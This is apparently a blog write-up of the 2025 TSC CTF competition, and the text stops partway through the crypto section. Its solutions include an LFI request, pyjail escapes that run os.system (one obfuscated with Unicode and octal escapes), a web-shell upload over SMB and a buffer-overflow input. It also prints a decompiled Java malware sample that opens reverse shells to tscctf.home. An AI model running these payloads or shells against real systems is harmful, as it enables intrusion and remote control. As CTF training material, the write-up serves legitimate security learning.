---
title: 2025 TSC CTF Writeup
date: 2025-01-16 15:37:39
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/Blog_cover%20(18).jpg
categories: CTF
tags: 
---

# Prologue

This is the first time I have won a place in a CTF contest. Following are the score board and my score over time.

![Top 10 Users on Qualified Score Board](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20250116155552695.png)

![Score over Time](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/Score over Time.png)

# Web

## Ave Mujica

After some recons, I found the web server is built by **gunicorn**, and the web looks like having a directory traversal to LFI vulnerability. After I go do some research, I tried some LFI wordlist and finally got the flag by reading the `/proc/self/environ`. The PoC is as follows.

```bash
curl 'http://172.31.3.2:168/image?name=../../../../proc/self/environ' --output flag.txt
```

```txt
TSC{敬愛爽🍷}
```

## Be_IDol

By checking the source code of the web during the recon stage, I found that there's a back door leaving by the author (58 to 64 lines).

```html
<!DOCTYPE html>
<html>
    <head>
        <title>File System Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f5f5f5;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-container {
                background: white;
                padding: 40px;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                width: 300px;
            }
            .login-container h2 {
                margin: 0 0 20px 0;
                text-align: center;
                color: #333;
            }
            .form-group {
                margin-bottom: 15px;
            }
            .form-group label {
                display: block;
                margin-bottom: 5px;
                color: #666;
            }
            .form-group input {
                width: 100%;
                padding: 8px;
                border: 1px solid #ddd;
                border-radius: 4px;
                box-sizing: border-box;
            }
            .submit-btn {
                width: 100%;
                padding: 10px;
                background-color: #4caf50;
                border: none;
                color: white;
                border-radius: 4px;
                cursor: pointer;
            }
            .error {
                color: red;
                margin-bottom: 15px;
                text-align: center;
            }
        </style>
        <script>
            // Backdoor function - ez_login()
            function ez_login() {
                document.cookie = "PHPSESSID=secretbackdoor123";
                location.reload();
            }
        </script>
    </head>
    <body>
        <div class="login-container">
            <h2>Internal File System</h2>
            <form method="POST" action="login.php">
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="username" required />
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" required />
                </div>
                <button type="submit" class="submit-btn">Login</button>
            </form>
        </div>
    </body>
</html>
```

After logging in, we can found 1000 pdf documents (I forgot to take a screen shot lol), and those document can be accessed by `http://172.31.0.2:8057/download.php?file_id=<FILE_ID>`, since the files with the IDs listed on the web page are just nonsense, so I tried to enumerate more IDs to check if there's something interesting.

```python
import requests
from rich.progress import track

url = "http://172.31.0.2:8057/download.php?file_id="

for file_id in track(range(10000, 20000)):
    new_url = url + str(file_id)
    # print(f"[*] Downloading: {new_url}")

    try:
        response = requests.get(new_url)

        if response.status_code == 200 and b"This is a normal" not in response.content:
            with open(f"downloaded_{file_id}.pdf", "wb") as f:
                f.write(response.content)
            print(f"[+] Success: downloaded_{file_id}.pdf")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")

print("[*] Finish")
```

After the script finished, we can use `cat *.pdf` to check the contents in the response. By doing that, we can found a web shell left by someone with the ID 12001 (IIRC). So I access `http://172.31.0.2:8057/download.php?file_id=12001`, then I found the web shell!

Then, I used those command below to leak the flag out.

```bash
find / -type f -iname "*flag*" 2>/dev/null
cat /opt/flag/flag.txt
```

```txt
TSC{You_can_be_ID0R_12353oujhefrgiuoewihoqweihfo}
```

# Misc

## BabyJail

The source code is as follows.

```python
#!/usr/local/bin/python3

print(eval(input("> "), {"__builtins__": {}}, {}))
```

First, we can use `().__class__.__bases__[0].__subclasses__()` to leak all the subclasses we can use, then I found `().__class__.__bases__[0].__subclasses__()[114]` is `().__class__.__bases__[0].__subclasses__()[114] == <class '_frozen_importlib._WeakValueDictionary'>`, which is the one I'm going to utilize.

Since we've got the subclass we need, we can just init the class and import the module we need. Final payload:

```python
().__class__.__bases__[0].__subclasses__()[114].__init__.__globals__['__import__']('os').system('ls')
# ().__class__.__bases__[0].__subclasses__()[114] == <class '_frozen_importlib._WeakValueDictionary'>
().__class__.__bases__[0].__subclasses__()[114].__init__.__globals__['__import__']('os').system('cat flag_LwAyYvKd')
```

```txt
TSC{just_a_classic_nobuiltins_pyjail_for_baby}
```

## calc

In this one, we can't use any ASCII letters and `[]`. There's a classic way to bypass this check, which is using the unicode encoding. That works because some of the unicode letters function the same as the ASCII one (in Python 3), but they're different on the code point. To learn more details, you can search for **NFKC** or something like that.

The tool I used is this one: [ASCII to Strange Unicode (I used the third)](https://yaytext.com/bold-italic/)

So, we can get all of subclasses of a tuple by using the following payload. Because we can't use the brackets here, I used the `__getitem__()` to do the same thing.  

```python
().__𝒄𝒍𝒂𝒔𝒔__.__𝒃𝒂𝒔𝒆𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(0).__𝒔𝒖𝒃𝒄𝒍𝒂𝒔𝒔𝒆𝒔__()
```

Then, as the way we do in **BabyJail**, we can use the index of 114 to get the module we need.

```python
().__𝒄𝒍𝒂𝒔𝒔__.__𝒃𝒂𝒔𝒆𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(0).__𝒔𝒖𝒃𝒄𝒍𝒂𝒔𝒔𝒆𝒔__().__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(114).__𝒊𝒏𝒊𝒕__.__𝒈𝒍𝒐𝒃𝒂𝒍𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__('__𝒊𝒎𝒑𝒐𝒓𝒕__')('𝒐𝒔').𝒔𝒚𝒔𝒕𝒆𝒎('𝒍𝒔')
```

But since the `__𝒊𝒎𝒑𝒐𝒓𝒕__` unicode letters won't be parse as a ASCII, we will receive a KeyError. To avoid that, we should use octal representation in strings to access the modules. The same operation should be applied to everything inside `''` or `""`. ([Details Here](https://docs.python.org/3/reference/lexical_analysis.html#string-and-bytes-literals))      

So the final payload will be:

```python
().__𝒄𝒍𝒂𝒔𝒔__.__𝒃𝒂𝒔𝒆𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(0).__𝒔𝒖𝒃𝒄𝒍𝒂𝒔𝒔𝒆𝒔__().__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(114).__𝒊𝒏𝒊𝒕__.__𝒈𝒍𝒐𝒃𝒂𝒍𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__('__\151\155\160\157\162\164__')('\157\163').𝒔𝒚𝒔𝒕𝒆𝒎('\154\163')

# ().__𝒄𝒍𝒂𝒔𝒔__.__𝒃𝒂𝒔𝒆𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(0).__𝒔𝒖𝒃𝒄𝒍𝒂𝒔𝒔𝒆𝒔__().__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(114).__𝒊𝒏𝒊𝒕__.__𝒈𝒍𝒐𝒃𝒂𝒍𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__('__𝒊𝒎𝒑𝒐𝒓𝒕__')('𝒐𝒔').𝒔𝒚𝒔𝒕𝒆𝒎('𝒍𝒔')

().__𝒄𝒍𝒂𝒔𝒔__.__𝒃𝒂𝒔𝒆𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(0).__𝒔𝒖𝒃𝒄𝒍𝒂𝒔𝒔𝒆𝒔__().__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(114).__𝒊𝒏𝒊𝒕__.__𝒈𝒍𝒐𝒃𝒂𝒍𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__('__\151\155\160\157\162\164__')('\157\163').𝒔𝒚𝒔𝒕𝒆𝒎('\143\141\164\40\146\154\141\147\137\65\122\105\145\146\124\163\145')

# ().__𝒄𝒍𝒂𝒔𝒔__.__𝒃𝒂𝒔𝒆𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(0).__𝒔𝒖𝒃𝒄𝒍𝒂𝒔𝒔𝒆𝒔__().__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__(114).__𝒊𝒏𝒊𝒕__.__𝒈𝒍𝒐𝒃𝒂𝒍𝒔__.__𝒈𝒆𝒕𝒊𝒕𝒆𝒎__('__𝒊𝒎𝒑𝒐𝒓𝒕__')('𝒐𝒔').𝒔𝒚𝒔𝒕𝒆𝒎('𝒄𝒂𝒕 𝒇𝒍𝒂𝒈_5𝑹𝑬𝒆𝒇𝑻𝒔𝒆')
```

(I forgot to write the flag down lol, pass)

## A Minecraft SOC Mission

I use VSCode to open the `evil.class`, then it decompiled the file for me, so I got the java code as below.

```java
// Source code is decompiled from a .class file using FernFlower decompiler.
import java.util.Base64;

public class Evil extends ClassLoader {
    private static final String[] $ = new String[] {
        "QTlXNHY2eXVpPQ==",
        "WVcxdmJtY3NJR0Z1WkNCemJ5QnBjeUJwZENCbGVHVmpkWFJwYm1jPQ==",
        "ZEhOalpYUm1MbWh2YldVPQ=="
    };

    private static String = "k9";

    private static int = 1017;

    public Evil() {}

    private void ᅠ(byte[] var1) {
        try {
            String[] var2 = (new String(Base64.getDecoder().decode($[1]))).split(",");
            new String(Base64.getDecoder().decode($[2]));
            String var4 = (String) Class.forName("java.lang.System").getMethod("getProperty", String.class)
                .invoke((Object) null, var2[0]);
            boolean var5 = var4.toLowerCase().contains(var2[1]);
            String[] var10000;
            if (var5) {
                var10000 = new String[] {
                    "cmd.exe",
                    "/c",
                    null
                };
                String var10003 = new String(
                    new byte[] {
                        112,
                        111,
                        119,
                        101,
                        114,
                        115,
                        104,
                        101,
                        108,
                        108,
                        32,
                        45,
                        101,
                        32
                    });
                var10000[2] = var10003 +
                    "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAdABzAGMAYwB0AGYALgBoAG8AbQBlACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA";
            } else {
                var10000 = new String[] {
                    "/bin/bash",
                    "-c",
                    this.ㅤㅤ(new String[] {
                        "echo",
                        "YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==",
                        "base64",
                        "-d",
                        "bash"
                    })
                };
            }

            String[] var6 = var10000;
            Class.forName("java.lang.Runtime").getMethod("exec", String[].class)
                .invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke((Object) null), var6);
        } catch (Exception var7) {}

    }

    private String ㅤㅤ(String[] var1) {
        StringBuilder var2 = new StringBuilder();

        for (int var3 = 0; var3 < var1.length; ++var3) {
            var2.append(var1[var3]);
            if (var3 < var1.length - 1) {
                var2.append(" | ");
            }
        }

        return var2.toString();
    }

    static {
        (new Evil()).ᅠ(new byte[0]);
    }
}
```

On line from 51 to 61, we can found something interesting.

```java
var10000 = new String[] {
    "/bin/bash",
    "-c",
    this.ㅤㅤ(new String[] {
        "echo",
        "YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==",
        "base64",
        "-d",
        "bash"
    })
};
```

After decoding, we found it's `bash -i >& /dev/tcp/tscctf.home/443 0>&1`.

```txt
tscctf.home
```

## A_BIG_BUG

After basic enumeration, I found a `/uploads` directory, and the challenge descriptions said that the smb port is opened. In the challenge description, we can found the smb username `ctfuser` and we can guess the password to be `hi` by visiting the web (since it's the only info lol)     .

Since there's a path called `uploads`, let's try to upload something on the web server. BTW, wappalyzer showed that the backend language is PHP.

The one I use is [phpbash](https://github.com/Arrexel/phpbash), we can upload it by smb using the command below.

```bash
smbclient //172.31.0.2/uploads -U ctfuser -p 30159
# password = hi
put shell.php
```

Then, we can access the `http://172.31.0.2:<PORT>/uploads/shell.php` to execute commands.

```bash
find / -type f -iname "*flag*" 2>/dev/null
cat /tmp/flag.txt
```

```txt
TSC{YOU_got_What_is_pt_and_low_security_password_7ce870d92ff34960bca968a15020d0d0}
```

# Reverse

## What_Happend

There's a function called `_decrypt_flag()`, let's check the decompiled code first.

```c
004014af    int32_t _decrypt_flag()

void var_46  {Frame offset -46}
int32_t i  {Frame offset -10}
uint32_t eax  {Register eax}

004014af    {
004014af        uint32_t eax = strlen(&_.rdata);
004014f1        void var_46;
004014f1        
004014f1        for (int32_t i = 0; i < eax; i += 1)
004014f1            *(i + &var_46) = *(i + &_.rdata) ^ 0xaa;
004014f1        
004014fb        *(eax + &var_46) = 0;
00401513        return printf("Decrypted Flag: %s\n", &var_46);
004014af    }
```

It's just XOR every characters in the `_.rdata` with 0xAA and save it into `var_46`.

```python
ciphertext = bytes(
    [
        0xFE,
        0xF9,
        0xE9,
        0xD1,
        0xE3,
        0xF5,
        0xFE,
        0xC2,
        0xC3,
        0xC4,
        0xC1,
        0xF5,
        0xD3,
        0xC5,
        0xDF,
        0xF5,
        0xEC,
        0xC3,
        0xD2,
        0xF5,
        0x98,
        0xC5,
        0xC7,
        0xCF,
        0xF5,
        0x99,
        0xD8,
        0xD8,
        0xC5,
        0xD8,
        0xD7,
    ]
)

key = 0xAA

# 解密
plaintext = "".join(chr(byte ^ key) for byte in ciphertext)
print("Decrypted Flag:", plaintext)
```

```txt
TSC{I_Think_you_Fix_2ome_3rror}
```

## Chill Checker

Let's see the main function.

```c
00001394    int32_t main(int32_t argc, char** argv, char** envp)

char** argv_1  {Frame offset -58}
int32_t argc_1  {Frame offset -4c}
int64_t var_48  {Frame offset -48}
void user_input  {Frame offset -28}
int32_t var_14  {Frame offset -14}
int32_t i_1  {Frame offset -10}
int32_t i  {Frame offset -c}
char** envp  {Register rdx}
char** argv  {Register rsi}
int32_t argc  {Register rdi}

00001394    {
00001394        int32_t argc_1 = argc;
0000139f        char** argv_1 = argv;
000013a3        int32_t var_14 = 0xdeadbeef;
000013c5        int64_t var_48;
000013c5        
000013c5        for (int32_t i = 0; i <= 0x13; i += 1)
000013c5            *(&var_48 + i) = 0;
000013c5        
000013d5        __builtin_strncpy(&var_48, "SGZIYIHW", 8);
000013e7        printf("Whisper your code: ");
00001402        void user_input;
00001402        __isoc99_scanf("%8s", &user_input);
00001402        
0000143f        for (int32_t i_1 = 0; i_1 <= 7; i_1 += 1)
0000143f            *(&user_input + i_1) = complex_function(*(&user_input + i_1), i_1 + 8);
0000143f        
00001456        if (!strcmp(&user_input, &var_48))
00001456        {
0000146e            puts("Man, you're really on fire!");
0000147a            generate_flag(&user_input);
00001456        }
00001456        else
0000145d            random_failure_message();
0000145d        
00001485        return 0;
00001394    }
```

So we can find out what the code is and use it as the input of the program. Decompiled code of the `complex_function()` is as follows.

```c
000011de    uint64_t complex_function(int32_t arg1, int32_t arg2)

int32_t arg2  {Register rsi}
int32_t arg1  {Register rdi}

000011de    {  // Check it's from 'A' to 'Z'
000011de        if (arg1 > 64 && arg1 <= 90)
00001247            return (arg1 - 0x41 + arg2 * 0x1f) % 26 + 0x41;
00001247        
00001202        puts("Go to reverse, please.");
0000120c        exit(1);
0000120c        /* no return */
000011de    }
```

So we can get the code by using this exploit generated by ChatGPT.

```python
def reverse_complex_function(output, index):
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    # 將字符轉換為數字
    y = ord(output) - 0x41
    # 逆向計算原始字符
    original = (y - index * 0x1F) % 26
    return charset[original]


# 已知密文
ciphertext = "SGZIYIHW"
plaintext = ""

# 逆向解密
for i in range(len(ciphertext)):
    plaintext += reverse_complex_function(ciphertext[i], i + 8)

print(f"[+] Decrypted Input: {plaintext}")

# Output: [+] Decrypted Input: ENBFQVPZ
```

```bash
echo 'ENBFQVPZ' | ./chill
```

```txt
TSC{t4k3_1t_3a$y}
```

## Gateway to the Reverse

```bash
echo 'TEST' | ltrace ./gate
```

```txt
TSC{th1s_1s_b4by_r3v3rs3_b4by}
```

## Link Start

It's a doubly linked list. I created a node like this in Binja.

```c
struct Node __packed
{
    char data;
    char _padding[0x7];
    struct Node* prev;
    struct Node* next;
};
```

Then the reversed main function is as follows.

```c
000013dd    int32_t main(int32_t argc, char** argv, char** envp)

int32_t i  {Frame offset -118}
int32_t count  {Frame offset -114}
int32_t i_1  {Frame offset -110}
int32_t i_2  {Frame offset -10c}
struct Node* head  {Frame offset -108}
int32_t var_fc  {Frame offset -fc}
int64_t input_flag  {Frame offset -f8}
int64_t final_str  {Frame offset -88}
int64_t rax  {Register rax}
int32_t result  {Register rax}
char** envp  {Register rdx}
char** argv  {Register rsi}
int32_t argc  {Register rdi}
void* fsbase  {Register fsbase}

000013dd    {
000013dd        void* fsbase;
000013ed        int64_t rax = *(fsbase + 0x28);
00001406        struct Node* head = malloc(24);
00001414        head->data = 0;
00001425        head->next = head;
00001437        head->prev = head;
0000143b        int64_t input_flag;
0000143b        __builtin_memset(&input_flag, 0, 0x64);
000014c9        int64_t final_str;
000014c9        __builtin_memset(&final_str, 0, 0x64);
00001537        puts("Link Start!");
00001548        printf("Give me flag to logout: ");
00001563        fgets(&input_flag, 0x64, stdin);
0000157e        *(&input_flag + strcspn(&input_flag, u"\n…")) = 0;
00001599        int32_t result;
00001599        
00001595        // flag lenght is 44
00001599        if (strlen(&input_flag) != 44)
00001599        {
00001795            failed:
00001795            puts("Logout Failed :(");
000017a4            clean(head);
000017a9            result = 1;
00001599        }
00001599        else
00001599        {
000015ae            if (strlen(&input_flag) & 3)  // if len(flag) % 4 != 0
000015b4                goto failed;
000015b4            
00001606            for (int32_t i = strlen(&input_flag) - 1; i >= 0; i -= 1)
00001606                insert_to_head(&head, *(&input_flag + i));
00001606            
00001608            int32_t count = 0;
00001608            
0000171f            while (count < strlen(&input_flag))  // while count < 44
0000171f            {
0000171f                int32_t var_fc = 0;
0000171f                
00001669                for (int32_t i_1 = 0; i_1 <= 3; i_1 += 1)
00001669                    *(&var_fc + i_1) = pop_node(&head) ^ (i_1 + 1) << 4;
00001669                
00001681                insert_to_head(&head, *var_fc[2]);
0000169c                insert_to_head(&head, var_fc);
000016b7                insert_to_head(&head, *var_fc[1]);
000016d2                insert_to_head(&head, *var_fc[3]);
000016d2                
00001703                // Jump 4 node that just inserted
00001703                for (int32_t i_2 = 0; i_2 <= 3; i_2 += 1)
00001703                    head = head->next;
00001703                
00001705                count += 4;
0000171f            }
0000171f            
00001738            head = head->next;
00001750            linked_list_to_str(head, &final_str);
00001750            
0000176a            if (strcmp(&final_str, &encrypted_flag))  // if not the same
0000176a                goto failed;
0000176a            
00001773            puts("Logout Success :)");
00001782            clean(head);
00001787            result = 0;
00001599        }
00001599        
000017bb        if (rax == *(fsbase + 0x28))
000017cb            return result;
000017cb        
000017bd        __stack_chk_fail();
000017bd        /* no return */
000013dd    }
```

Since it's fully reversed, I'll skip the details of other operations of the doubly linked list, you can know what they're doing by their function name. To get the flag, we can run the following exploit.

```python
data2020_hex = "3b7344731f1049451f722455717f717c246b7e03756c4f79217f647d1274635521604f5b0d6c4f7c3d5e6e4e"
# Flag length = 88 hex chars = 44 bytes
assert len(data2020_hex) == 88, "data2020_hex should be 44 bytes in hex (88 chars)"
data2020 = bytes.fromhex(data2020_hex)

FLAG_LEN = 44


def rotate_index(idx, step, length):
    """在長度為 length 的循環陣列裡，index 往前移 step"""
    return (idx + step) % length


def solve_backwards(final_bytes):
    """直接從最終 44-byte 的 data2020 '反推' 原本的 flag。"""
    # 1) 建立陣列 arr，初始內容就是最終 data2020
    arr = list(final_bytes)  # 以 int(0~255) 表示
    length = len(arr)  # 44
    head = 0  # 假設最終狀態 head=0 (對應展開 final_str)

    # 2) 正向程式中：for(var_114=0; var_114<44; var_114+=4) { ... }
    #    在逆向就要從 var_114=40,36,32...0 (每次處理 4 bytes)
    for var_114 in range(length - 4, -1, -4):
        # 正向尾段會「skip 4」，逆向先 unskip(4)
        head = (head - 4) % len(arr)

        # 正向結尾插入4個byte的順序: var_fc[2], var_fc[0], var_fc[1], var_fc[3]
        # => 逆向先把這4個 byte 從 arr[head] 依序 pop 出 (因為 insert_to_head 每次都把新元素放在 head 所在處)
        #   不過插入時順序 => 先插 var_fc[3] => head? 其實需仔細倒推
        # 簡單做法: 逆向 pop 4 次 => 這就是 (var_fc[3], var_fc[1], var_fc[0], var_fc[2])
        #           (因最後插入 var_fc[3] 在頭 => 最先被 pop)
        extracted = []
        for _ in range(4):
            # pop head
            c = arr[head]  # 讀出
            del arr[head]  # 刪除
            # 刪除後 head 不變，因為 delete index=head 之後，右邊元素往左 shift
            # (在鏈表是 head= head->next, 這裡需小心)
            extracted.append(c)

        # extracted = [var_fc[3], var_fc[1], var_fc[0], var_fc[2]]
        # => 我們要還原 var_fc = [var_fc0, var_fc1, var_fc2, var_fc3]
        var_fc3 = extracted[0]
        var_fc1 = extracted[1]
        var_fc0 = extracted[2]
        var_fc2 = extracted[3]
        var_fc = [var_fc0, var_fc1, var_fc2, var_fc3]

        # 這 var_fc[i_1] = (pop_node_output ^ ((i_1+1)<<4)) in 正向
        # => pop_node_output = var_fc[i_1] ^ ((i_1+1)<<4)
        pop_out = []
        for i_1 in range(4):
            real_c = var_fc[i_1] ^ ((i_1 + 1) << 4)
            pop_out.append(real_c)

        # 這 4 個 pop_out 就是正向程式當時 "pop_node(&head)" 取到的字元
        # => 要把它們放回陣列頭 (逆向 "undo pop" 之意),
        # 不過正向 pop 的順序是 head, head->next, head->next->next, head->next->next->next
        # => 只要在逆向裡先插 pop_out[3], 再 pop_out[2], pop_out[1], pop_out[0] 逐一 insert_to_head
        # => insert_to_head => array.insert(head, c); head stays at that inserted?
        # 簡化: 我們從 left to right insert => 會成一個 reversed, 但正好對應 pop 順序
        for c in reversed(pop_out):
            arr.insert(head, c)
            # insert 之後 new elem 就在 head 位置 => head = head ???
            # 但 "insert_to_head" 會把 new element 當新 head => head 不變 => 符合

    # 結束後，arr 就是「執行完最初反序插入 (step1)」的狀態，
    #  arr[0] => sentinel(=0) ?  arr[1..44] => reversed flag ...?
    #  依實際題目: 頭節點 data=0 => + 44 bytes => total 45
    # => 我們看看 arr[0] 可能 = 0 (哨兵).
    # => 之後 arr[1..44] 是 reversed input

    reversed_flag = arr[0 : 1 + FLAG_LEN]

    return bytes(reversed_flag)


def main():
    original = solve_backwards(data2020)
    try:
        print("Recovered Flag:", original.decode())
    except UnicodeDecodeError:
        print("Recovered Flag (hex):", original.hex())


if __name__ == "__main__":
    main()
```

```txt
TSC{Y0u_4Re_a_L1nK3d_LI5t_MasTeR_@ka_LLM~~~}
```

# Pwn

## gamble_bad_bad

Source first.

```cpp
#include <string.h>
#include <iostream>
#include <stdio.h>
using namespace std;

void jackpot() {
    char flag[50];
    FILE *f = fopen("/home/gamble/flag.txt", "r");
    if (f == NULL) {
        printf("錯誤：找不到 flag 檔案\n");
        return;
    }
    fgets(flag, 50, f);
    fclose(f);

    printf("恭喜你中了 777 大獎！\n");
    printf("Flag 是：%s", flag);
}

struct GameState {
    char buffer[20];
    char jackpot_value[4];
} game;

void spin() {
    strcpy(game.jackpot_value, "6A6");

    printf("輸入你的投注金額：");
    gets(game.buffer);

    printf("這次的結果為：%s\n", game.jackpot_value);

    if (strcmp(game.jackpot_value, "777") == 0) {
        jackpot();
    } else {
        printf("很遺憾，你沒中獎，再試一次吧！\n");
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    printf("歡迎來到拉霸機！試著獲得 777 大獎吧！\n");
    spin();
    return 0;
}
```

There's a buffer overflow on line 29, since the buffer size is 20, we can construct the following exploit.

```python
python -c "print('A'*20+'777')" | nc 172.31.0.2 1337
```

That will cover the `jackpot_value` in `GameState` strcuture to be `777`.

```txt
TSC{Gamb1e_Very_bad_bad_but_}
```

# Crypto

## Very Simple Login

Source first.

```python
import base64
import hashlib
import json
import os
import re
import sys
import time
from secret import FLAG


# This is not XOR, this is AND
def xor(message0: bytes, message1: bytes) -> bytes:
    return bytes(byte0 & byte1 for byte0, byte1 in zip(message0, message1))


def sha256(message: bytes) -> bytes:
    return hashlib.sha256(message).digest()


def hmac_sha256(key: bytes, message: bytes) -> bytes:
    blocksize = 64
    if len(key) > blocksize:
        key = sha256(key)
    if len(key) < blocksize:
        key = key + b"\x00" * (blocksize - len(key))
    o_key_pad = xor(b"\x5c" * blocksize, key)
    i_key_pad = xor(b"\x3c" * blocksize, key)
    return sha256(o_key_pad + sha256(i_key_pad) + message)


def sha256_jwt_dumps(data: dict, exp: int, key: bytes):
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": data, "exp": exp}
    header = base64.urlsafe_b64encode(json.dumps(header).encode())
    payload = base64.urlsafe_b64encode(json.dumps(payload).encode())
    signature = hmac_sha256(key, header + b"." + payload)
    signature = base64.urlsafe_b64encode(signature).rstrip(b"=")
    return header + b"." + payload + b"." + signature


def sha256_jwt_loads(jwt: bytes, exp: int, key: bytes) -> dict | None:
    header_payload, signature = jwt.rsplit(b".", 1)

    sig = hmac_sha256(key, header_payload)
    sig = base64.urlsafe_b64encode(sig).rstrip(b"=")
    if sig != signature:
        raise ValueError("JWT error")

    try:
        header, payload = header_payload.split(b".")[0], header_payload.split(b".")[-1]
        header = json.loads(base64.urlsafe_b64decode(header))
        payload = json.loads(base64.urlsafe_b64decode(payload))
        if (header.get("alg") != "HS256") or (header.get("typ") != "JWT"):
            raise ValueError("JWT error")
        if int(payload.get("exp")) < exp:
            raise ValueError("JWT error")
    except Exception:
        raise ValueError("JWT error")
    return payload.get("sub")


def register(username: str, key: bytes):
    if re.fullmatch(r"[A-z0-9]+", username) is None:
        raise ValueError("'username' format error.")
    return sha256_jwt_dumps({"username": username}, int(time.time()) + 86400, key)


def login(token: bytes, key: bytes):
    userdata = sha256_jwt_loads(token, int(time.time()), key)
    return userdata["username"]


def menu():
    for _ in range(32):
        print("==================")
        print("1. Register")
        print("2. Login")
        print("3. Exit")
        try:
            choice = int(input("> "))
        except Exception:
            pass
        if 1 <= choice <= 3:
            return choice
        print("Error choice !", end="\n\n")
    sys.exit()


def main():
    key = os.urandom(32)
    for _ in range(32):
        choice = menu()
        if choice == 1:
            username = input("Username > ")
            try:
                token = register(username, key)
            except Exception:
                print("Username Error !", end="\n\n")
                continue
            print(f"Token : {token.hex()}", end="\n\n")
        if choice == 2:
            token = bytes.fromhex(input("Token > "))
            try:
                username = login(token, key)
            except Exception:
                print("Token Error !", end="\n\n")
            if username == "Admin":
                print(f"FLAG : {FLAG}", end="\n\n")
                sys.exit()
            else:
                print("FLAG : TSC{???}", end="\n\n")
        if choice == 3:
            sys.exit()


if __name__ == "__main__":
    try:
        main()
    except Exception:
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()
```

We can simply just register an username called **Admin**, so the exploit is as follows.

```python
from pwn import *

HOST = "172.31.2.2"
PORT = 36900


def exploit():

    r = remote(HOST, PORT)

    r.sendline(b"1")
    r.recvuntil(b"Username > ")
    r.sendline(b"Admin")
    token = r.recvuntil(b"==================").decode().split(":")[1].strip()
    print(f"Token = {token}")

    r.sendline(b"2")
    r.recvuntil(b"Token > ")
    r.sendline(token.encode())

    r.interactive()


if __name__ == "__main__":
    exploit()
```

```txt
 TSC{Wr0nG_HM4C_7O_L3A_!!!}
```

## Classic

Source first.

```python
import os
import string
import secrets

flag = os.getenv("FLAG") or "TSC{test_flag}"

charset = string.digits + string.ascii_letters + string.punctuation
A, B = secrets.randbelow(2**32), secrets.randbelow(2**32)
assert len(set((A * x + B) % len(charset) for x in range(len(charset)))) == len(charset)

enc = "".join(charset[(charset.find(c) * A + B) % len(charset)] for c in flag)
